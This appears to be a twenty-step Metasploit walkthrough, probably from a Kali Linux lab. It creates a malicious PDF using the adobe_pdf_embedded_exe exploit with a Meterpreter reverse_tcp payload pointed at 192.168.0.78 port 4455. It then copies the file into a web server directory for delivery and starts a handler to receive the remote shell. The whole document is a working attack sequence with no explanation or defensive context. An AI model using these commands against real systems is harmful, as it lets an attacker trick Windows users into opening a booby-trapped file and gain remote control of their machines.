


STEP 1 -  sudo su 

STEP 2 -  cd

STEP 3 -  cd

STEP 4 -  msfconsole

STEP 5 -  search type:exploit platform:windows adobe:pdf

STEP 6 -  use exploit/windows/fileformat/adobe_pdf_embedded_exe

STEP 7 -  info_

STEP 8 -  set payload windows/meterpreter/reverse_tcp

STEP 9 -  show options

STEP 10 -  set LHOST 192.168.0.78

STEP 11 -  set LPORT 4455

STEP 12 -  set FILENAME test.pdf

STEP 13 -  show options

STEP 14 -  exploit

STEP 15 -  sudo mv /home/kali/.msf4/local/test.pdf /var/www/html

STEP 16 -  use exploit/multi/handler

STEP 17 -  set payload windows/meterpreter/reverse_tcp

STEP 18 -  set LHOST 192.168.0.78

STEP 19 -  set LPORT 4455

STEP 20 -  exploit



